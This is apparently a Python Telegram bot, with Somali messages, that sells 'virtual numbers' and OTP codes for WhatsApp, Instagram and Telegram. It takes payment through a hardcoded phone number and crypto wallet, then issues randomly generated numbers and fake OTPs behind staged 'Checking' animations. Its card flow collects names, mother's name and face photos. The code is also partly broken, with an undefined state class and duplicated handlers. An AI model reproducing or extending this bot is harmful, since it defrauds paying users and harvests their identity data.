import os
import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.default import DefaultBotProperties

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= DATA STORAGE =================
users = {}
pending_admin_register = {}

# ================= STATES =================
class VirtualState(StatesGroup):
    waiting_screenshot = State()

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp():
    return "".join(random.choices("0123456789", k=6))

async def live_animation(msg: Message, text="Checking", seconds=5):
    for i in range(seconds):
        dots = "." * (i % 4)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")],
        [InlineKeyboardButton(text="CARD", callback_data="card_start")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================== VIRTUAL FLOW =================
@dp.callback_query(F.data == "virtual_start")
async def virtual_platform(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="v_platform_WHATSAPP")],
        [InlineKeyboardButton(text="INSTAGRAM", callback_data="v_platform_INSTAGRAM")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="v_platform_TELEGRAM")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_platform_"))
async def virtual_platform_selected(call: CallbackQuery):
    platform = call.data.split("_")[2]
    number = random_number()
    users[call.from_user.id] = {
        "type": "virtual",
        "platform": platform,
        "number": number,
        "price": "$0.8"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_payment_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_payment_crypto")]
    ])
    await call.message.edit_text(
        f"Number: {number}\nQiimaha: $0.8\nDooro Payment:", reply_markup=kb
    )

# ================= VIRTUAL LOCAL PAYMENT =================
@dp.callback_query(F.data == "v_payment_local")
async def virtual_local_payment(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    data = users.get(uid)
    if not data:
        await call.message.answer("❌ Dalabka lama helin. Fadlan bilow order cusub.")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]
    ])
    await call.message.edit_text(
        f"Lacagta ku dir lambarkan:\n\n{LOCAL_NUMBER}\nLambarkaaga: {data['number']}\nQiimaha: {data['price']}",
        reply_markup=kb
    )

# ================= CONFIRM LOCAL PAYMENT =================
@dp.callback_query(F.data.startswith("v_confirm_payment_"))
async def virtual_confirm_payment(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[-1])
    msg = await call.message.edit_text("Checking...")
    await live_animation(msg, "Checking", 5)

    await call.message.answer("Fadlan soo dir Screenshot-ka lacag bixinta (PAYMENT)")
    await state.set_state(VirtualState.waiting_screenshot)

# ================= RECEIVE SCREENSHOT =================
@dp.message(F.photo)
async def virtual_receive_screenshot(msg: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state != VirtualState.waiting_screenshot:
        return  # Ignore messages outside the expected state

    uid = msg.from_user.id
    data = users.get(uid)
    if not data:
        await msg.answer("❌ Dalabka lama helin. Fadlan bilow order cusub.")
        await state.clear()
        return

    users[uid]["screenshot"] = msg.photo[-1].file_id
    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")

    # Inline buttons for admin
    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"),
            InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}")
        ]
    ])

    caption = (
        f"New Virtual Order\n"
        f"User: {uid}\n"
        f"Platform: {data['platform']}\n"
        f"Number: {data['number']}\n"
        f"Payment Type: LOCAL"
    )
    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb_admin)
    await state.clear()

# ================= ADMIN ACTIONS =================
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm_payment(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    await bot.send_message(uid, "✅ Lacagta waa la xaqiijiyay. Adeeggaaga waa la diyaariyey.")
    await call.message.edit_caption("✅ PAYMENT CONFIRMED")

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject_payment(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    await bot.send_message(uid, "❌ Payment lama xaqiijin. Fadlan lacagta dib u soo dir.")
    await call.message.edit_caption("❌ PAYMENT REJECTED")
    users.pop(uid, None)

@dp.callback_query(F.data.startswith("admin_otp_"))
async def admin_send_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    otp = generate_otp()
    users[uid]["otp"] = otp
    users[uid]["otp_requests"] = 0  # track requests
    kb_user = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]
    ])
    await bot.send_message(
        uid,
        f"Number: {users[uid]['number']}\nPlatform: {users[uid]['platform']}\n\nPAYMENT: PAID ✅",
        reply_markup=kb_user
    )
    await call.message.edit_caption("OTP sent to user (hidden from admin)")

# ================= USER SEE OTP =================
@dp.callback_query(F.data == "show_otp_user")
async def show_otp_user(call: CallbackQuery):
    uid = call.from_user.id
    otp = users.get(uid, {}).get("otp")
    if not otp:
        await call.message.edit_text("❌ OTP lama helin, fadlan la xiriir admin.")
        return
    msg = await call.message.edit_text("OTP Loading...")
    await live_animation(msg, "OTP", 5)
    kb_check = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])
    await msg.edit_text(f"Your OTP Code:\n\n{otp}", reply_markup=kb_check)

@dp.callback_query(F.data == "check_again_otp")
async def check_again_otp(call: CallbackQuery):
    uid = call.from_user.id
    users[uid]["otp_requests"] += 1
    new_otp = generate_otp()
    users[uid]["otp"] = new_otp
    msg = await call.message.edit_text("Generating new OTP...")
    await live_animation(msg, "OTP", 5)
    kb_check = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])
    await msg.edit_text(f"Your NEW OTP Code:\n\n{new_otp}", reply_markup=kb_check)

    if users[uid]["otp_requests"] == 2:
        kb_admin = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CONFIRM OTP", callback_data=f"admin_final_confirm_{uid}")]
        ])
        await bot.send_message(ADMIN_ID, f"User {uid} has requested OTP 2 times. Confirm final OTP.", reply_markup=kb_admin)

# ================= ADMIN FINAL CONFIRM OTP =================
@dp.callback_query(F.data.startswith("admin_final_confirm_"))
async def admin_final_confirm_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    final_otp = users[uid].get("otp")
    await bot.send_message(uid, f"✅ OTP Final Confirmed: {final_otp}\nYour payment is now fully verified!")
    await call.message.edit_text(f"✅ User {uid} OTP Final Confirmed")

# ================= VIRTUAL CRYPTO PAYMENT =================
# ================== VIRTUAL CRYPTO PAYMENT ==================
@dp.callback_query(F.data == "v_payment_crypto")
async def virtual_crypto_payment(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    data = users.get(uid)
    if not data:
        await call.message.answer("❌ Dalabka lama helin. Fadlan bilow order cusub.")
        return

    text = (
        f"💰 Waxaad lacagta ku diri kartaa Crypto:\n\n"
        f"USDT: <code>{USDT_ADDRESS}</code>\n"
        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
        f"Kadib taabo CONFIRM si aad u sii wado."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_crypto_confirm_{uid}")]
    ])
    await call.message.edit_text(text, reply_markup=kb)

# -------- CONFIRM CRYPTO --------
@dp.callback_query(F.data.startswith("v_crypto_confirm_"))
async def virtual_crypto_confirm(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[-1])
    msg = await call.message.edit_text("Checking Crypto Payment...")
    await live_animation(msg, "Checking", 5)

    await call.message.answer("Fadlan soo dir Screenshot-ka lacag bixinta (Crypto Payment)")
    await state.set_state(VirtualState.waiting_screenshot)

# -------- RECEIVE CRYPTO SCREENSHOT --------
@dp.message(F.photo)
async def virtual_crypto_receive(msg: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state != VirtualState.waiting_screenshot:
        return  # Ignore messages outside the expected state

    uid = msg.from_user.id
    data = users.get(uid)
    if not data:
        await msg.answer("❌ Dalabka lama helin. Fadlan bilow order cusub.")
        await state.clear()
        return

    users[uid]["screenshot"] = msg.photo[-1].file_id
    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")

    # Send screenshot to admin with inline actions
    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"),
            InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}")
        ]
    ])

    caption = (
        f"New Virtual Crypto Order\n"
        f"User: {uid}\n"
        f"Platform: {data['platform']}\n"
        f"Number: {data['number']}\n"
        f"Payment Type: CRYPTO"
    )

    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb_admin)
    await state.clear()

# ================= CARD PAYMENT (LOCAL + CRYPTO) =================
@dp.callback_query(F.data.startswith("card_pay_"))
async def card_payment(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    uid = call.from_user.id

    if call.data == "card_pay_local":
        text = f"NUMBERKAN LACAGTA KU DIR\n{data['price']}\n{LOCAL_NUMBER}"
    else:
        text = f"USDT: <code>{USDT_ADDRESS}</code>\nBNB: <code>{BNB_ADDRESS}</code>"

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm_payment")]
    ])
    await call.message.edit_text(text, reply_markup=kb)

# -------- CARD CONFIRM PAYMENT --------
@dp.callback_query(F.data == "card_confirm_payment")
async def card_confirm_payment(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking Payment...")
    await live_animation(msg, "Checking", 5)
    await call.message.answer("Fadlan soo dir Screenshot-ka Lacag Bixinta.")
    await state.set_state(CardState.screenshot)

# -------- RECEIVE CARD SCREENSHOT --------
@dp.message(F.photo)
async def card_receive_screenshot(msg: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state != CardState.screenshot:
        return  # Ignore messages outside the expected state

    uid = msg.from_user.id
    data = await state.get_data()
    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")

    kb_admin = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_card_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_card_reject_{uid}")
        ]
    ])

    caption = (
        f"New CARD Order\n"
        f"User: {uid}\n"
        f"Type: {data['card_type']}\n"
        f"Full Name: {data['fullname']}\n"
        f"Mother: {data['mother']}\n"
        f"Number: {data['number']}\n"
        f"Price: {data['price']}"
    )

    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb_admin)
    await bot.send_photo(ADMIN_ID, data["face"])
    await state.clear()

# ================= ADMIN OTP & FINAL CONFIRM =================
@dp.callback_query(F.data.startswith("admin_otp_"))
async def admin_send_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    otp = generate_otp()
    users[uid]["otp"] = otp
    users[uid]["otp_requests"] = 0
    users[uid]["otp_sent"] = True

    kb_user = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]
    ])

    await bot.send_message(
        uid,
        f"✅ Payment la xaqiijiyay. Fadlan guji SHOW OTP si aad u aragto OTP-gaaga.",
        reply_markup=kb_user
    )
    await call.message.edit_caption("OTP sent to user (hidden)")

# -------- USER SHOW OTP --------
@dp.callback_query(F.data == "show_otp_user")
async def user_show_otp(call: CallbackQuery):
    uid = call.from_user.id
    if uid not in users or "otp" not in users[uid]:
        await call.answer("❌ OTP lama helin.", show_alert=True)
        return
    otp = users[uid]["otp"]
    msg = await call.message.edit_text("OTP Loading...")
    await live_animation(msg, "OTP", 5)
    kb_check = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])
    await msg.edit_text(f"Your OTP Code:\n\n{otp}", reply_markup=kb_check)

# -------- USER CHECK AGAIN OTP --------
@dp.callback_query(F.data == "check_again_otp")
async def user_check_again_otp(call: CallbackQuery):
    uid = call.from_user.id
    users[uid]["otp_requests"] += 1
    new_otp = generate_otp()
    users[uid]["otp"] = new_otp

    msg = await call.message.edit_text("Generating new OTP...")
    await live_animation(msg, "OTP", 5)
    kb_check = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])
    await msg.edit_text(f"Your NEW OTP Code:\n\n{new_otp}", reply_markup=kb_check)

    # Notify admin if requested twice
    if users[uid]["otp_requests"] == 2:
        kb_admin = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="CONFIRM OTP", callback_data=f"admin_final_confirm_{uid}")]
        ])
        await bot.send_message(
            ADMIN_ID,
            f"User {uid} has requested OTP 2 times. Confirm final OTP.",
            reply_markup=kb_admin
        )

# -------- ADMIN FINAL CONFIRM OTP --------
@dp.callback_query(F.data.startswith("admin_final_confirm_"))
async def admin_final_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    final_otp = users[uid].get("otp")
    await bot.send_message(uid, f"✅ OTP Final Confirmed: {final_otp}\nYour payment is now fully verified!")
    await call.message.edit_text(f"✅ User {uid} OTP Final Confirmed")

# ================= ERROR HANDLER & SAFETY =================
@dp.errors()
async def global_error_handler(update, exception):
    logging.error(f"Update: {update} raised exception {exception}")

# Prevent messages outside of state
@dp.message()
async def ignore_unexpected(msg: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        return

# Cleanup user data safely
async def safe_delete_user(uid: int):
    if uid in users:
        users.pop(uid, None)

# ================= LIVE ANIMATION UNIVERSAL =================
async def live_animation(message: Message, text="Loading", seconds=5):
    for i in range(seconds):
        dots = "." * (i % 4)
        await asyncio.sleep(1)
        await message.edit_text(f"{text}{dots}")

# ================= MAIN =================
async def main():
    print("Bot is running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
